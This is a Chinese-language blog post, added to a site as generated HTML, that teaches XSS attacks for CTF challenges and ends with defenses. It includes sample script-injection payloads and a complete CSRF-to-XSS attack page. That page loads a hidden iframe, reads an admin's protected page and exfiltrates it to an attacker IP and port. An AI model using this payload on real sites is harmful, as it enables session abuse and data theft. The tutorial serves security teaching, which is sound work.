@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>XSS跨站脚本攻击 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XSS 跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。 本文将介">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本攻击">
+<meta property="og:url" content="http://example.com/2024/05/20/Web/XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS 跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。 本文将介">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-20T09:17:08.305Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="跨站脚本">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/XSS/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      XSS跨站脚本攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
+<p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的 Web 漏洞，利用该漏洞，攻击者可以在受害者浏览器中注入并执行恶意脚本。在 CTF（Capture The Flag）竞赛中，XSS 攻击不仅是一种考察 Web 安全基础的攻击技术，同时也是非常实用的进阶手段，可以用来窃取敏感信息、绕过访问控制或结合 CSRF（跨站请求伪造）实现更复杂的链式攻击。</p>
+<p>本文将介绍 XSS 攻击的基本原理、常见类型、如何在 CTF 中利用 XSS 攻击，以及防御措施。</p>
+</blockquote>
+<h3 id="一、XSS-攻击基本原理"><a href="#一、XSS-攻击基本原理" class="headerlink" title="一、XSS 攻击基本原理"></a>一、XSS 攻击基本原理</h3><h4 id="1-什么是-XSS？"><a href="#1-什么是-XSS？" class="headerlink" title="1. 什么是 XSS？"></a>1. 什么是 XSS？</h4><blockquote>
+<p>XSS 攻击指的是攻击者通过在 Web 页面中注入恶意 JavaScript 代码，使得这些代码在其他用户的浏览器中执行。通过这种方式，攻击者可以篡改页面内容、窃取用户 Cookie、劫持用户会话，甚至对用户进行钓鱼攻击。</p>
+</blockquote>
+<h4 id="2-XSS-的类型"><a href="#2-XSS-的类型" class="headerlink" title="2. XSS 的类型"></a>2. XSS 的类型</h4><ul>
+<li><p><strong>反射型 XSS（Reflected XSS）：</strong><br>攻击者将恶意脚本嵌入到请求中，目标服务器将其反射到响应中。例如，通过 URL 参数传入恶意代码，目标页面在渲染时执行了该代码。</p>
+</li>
+<li><p><strong>存储型 XSS（Stored XSS）：</strong><br>恶意代码被永久存储在服务器上（例如数据库、留言板），当其他用户访问包含该内容的页面时，恶意代码被执行。</p>
+</li>
+<li><p><strong>DOM 型 XSS：</strong><br>恶意代码完全在客户端执行，通过修改页面的 DOM 结构，攻击者利用 JavaScript 动态修改页面内容，从而引发 XSS 漏洞。</p>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="二、CTF-中的-XSS-攻击"><a href="#二、CTF-中的-XSS-攻击" class="headerlink" title="二、CTF 中的 XSS 攻击"></a>二、CTF 中的 XSS 攻击</h3><blockquote>
+<p>在 CTF 中，XSS 攻击通常不是为了破坏 Web 应用，而是为了获得 flag。CTF 赛题往往会设置一些特定的场景，例如存储型 XSS、反射型 XSS 或利用 CSRF 触发 XSS 链，以考察参赛者对 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Web%20%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">Web 漏洞</a>利用链的理解和实践能力。</p>
+</blockquote>
+<p>‍</p>
+<h4 id="1-反射型-XSS-示例"><a href="#1-反射型-XSS-示例" class="headerlink" title="1. 反射型 XSS 示例"></a>1. 反射型 XSS 示例</h4><p>在反射型 XSS 题目中，用户提交的输入（例如 URL 参数、表单数据）被直接反射到页面中。如果输入没有经过充分过滤，攻击者可以构造如下 URL：</p>
+<p>​<code>http://example.com/search?query=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>​</p>
+<p><a href="http://example.com/search?query=">http://example.com/search?query=</a><script>alert&#39;XSS&#39;)</script></p>
+<h4 id="2-存储型-XSS-示例"><a href="#2-存储型-XSS-示例" class="headerlink" title="2. 存储型 XSS 示例"></a>2. 存储型 XSS 示例</h4><p>存储型 XSS 攻击中，攻击者提交的数据被存储在服务器上。当其他用户（例如管理员或特定用户）访问含有该数据的页面时，恶意代码会被执行。例如，攻击者在论坛留言中提交：</p>
+<p>​<code>&lt;script&gt;alert(&#39;PWNED&#39;);&lt;/script&gt;</code>​</p>
+<p>当管理员查看留言时，浏览器执行这段代码，攻击者可以利用此漏洞进一步窃取管理员信息或执行其他操作。</p>
+<h4 id="3-CSRF-与-XSS-的结合"><a href="#3-CSRF-与-XSS-的结合" class="headerlink" title="3. CSRF 与 XSS 的结合"></a>3. CSRF 与 XSS 的结合</h4><p>CTF 题目中，有时会将 CSRF 与 XSS 攻击结合起来，形成攻击链。例如：</p>
+<ul>
+<li><p>利用 CSRF 诱使管理员访问一个恶意页面（由攻击者控制）。</p>
+</li>
+<li><p>恶意页面通过反射型 XSS 载荷，让管理员的浏览器执行 JavaScript 代码。</p>
+</li>
+<li><p>利用 JavaScript 内部的 fetch() 请求获取管理员专属的页面内容（例如包含 flag 的页面）。</p>
+</li>
+<li><p>最终将页面内容通过 exfiltration（数据外泄）的方式发送到攻击者服务器。</p>
+</li>
+</ul>
+<p>这种 CSRF→XSS 链可以绕过 HttpOnly cookie 限制，因为一旦脚本在管理员浏览器中执行，它就能读取同源下的所有页面内容。</p>
+<hr>
+<h3 id="三、实战案例"><a href="#三、实战案例" class="headerlink" title="三、实战案例"></a>三、实战案例</h3><p>下面是一段示例代码，展示如何利用 CSRF-to-XSS 链来获取 flag。假设目标应用使用 Flask 开发，管理员的 flag 隐藏在一个草稿帖子中，只有在发布后才能完整显示，而管理员默认不会发布草稿。</p>
+<p>攻击思路如下：</p>
+<ol>
+<li>利用 CSRF 让管理员的浏览器访问一个恶意页面（由攻击者托管）。</li>
+<li>恶意页面反射 XSS 负载，利用 fetch() 请求目标页面（例如首页 &#x2F;），读取包含 flag 的 HTML 内容。</li>
+<li>利用 new Image().src 将获取到的数据以 GET 请求形式 exfiltrate 到攻击者服务器。</li>
+</ol>
+<p><strong>示例恶意页面代码：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF to XSS Attack: Publish Admin Draft<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Construct the XSS payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Dynamically construct the closing tag to avoid breaking the script.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="string">`&lt;scr`</span> + <span class="string">`ipt&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      // Use fetch() to retrieve the protected page (which now shows the full flag).</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server.</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          var exfilUrl = &quot;http://10.17.108.216:8888/?flag=&quot; + encodeURIComponent(data);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/scr`</span> + <span class="string">`ipt&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL-encode the payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> encodedPayload = <span class="built_in">encodeURIComponent</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Build the target URL using the /ephemeral endpoint, which reflects the msg parameter.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> targetUrl = <span class="string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Create a hidden iframe to force admin&#x27;s browser to load the target URL and execute the payload.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明：</strong></p>
+<ul>
+<li><p>将 <code>http://10.17.108.216:8888/</code>​ 替换为你攻击机的实际 IP 和监听端口。</p>
+</li>
+<li><p>当管理员（通过 victim 工具登录 admin）访问这个页面时，iframe 会加载 <code>http://challenge.localhost/ephemeral?msg=...</code>​，反射出 XSS 负载。</p>
+</li>
+<li><p>执行后，fetch() 请求会获取到包含 flag 的页面内容，并通过 Image 对象将数据发送到攻击者服务器。</p>
+</li>
+</ul>
+<hr>
+<h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><ul>
+<li><strong>输入过滤与输出编码：</strong><br>对所有用户输入进行严格过滤，并在输出时进行适当编码，防止 HTML&#x2F;JS 注入。</li>
+<li><strong>Content Security Policy (CSP)：</strong><br>实施 CSP 可有效限制内嵌脚本的执行，降低 XSS 攻击风险。</li>
+<li><strong>CSRF Token：</strong><br>对敏感操作采用 CSRF token 机制，确保请求来自可信任的页面。</li>
+<li><strong>HttpOnly Cookies：</strong><br>虽然 HttpOnly 可防止 JavaScript 直接访问 Cookie，但不能防止通过 XSS 进行间接的攻击（如 fetch() 读取页面内容）。</li>
+</ul>
+<hr>
+<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>XSS 攻击在 CTF 中非常常见，其形式多样，从简单的弹出框到复杂的 CSRF-to-XSS 链式攻击。通过学习和实践这些技巧，不仅可以提高你在 CTF 中的实战能力，也能加深对 Web 安全原理的理解。希望这篇博客能帮助你了解 XSS 攻击的各种方法及防御措施，并在 CTF 比赛中取得好成绩！</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/XSS/" data-id="cmawb0xup0001747k7wo4ewkb" data-title="XSS跨站脚本攻击" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          HTTP/HTTPS 简介
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/05/20/Web/CSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CSRF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
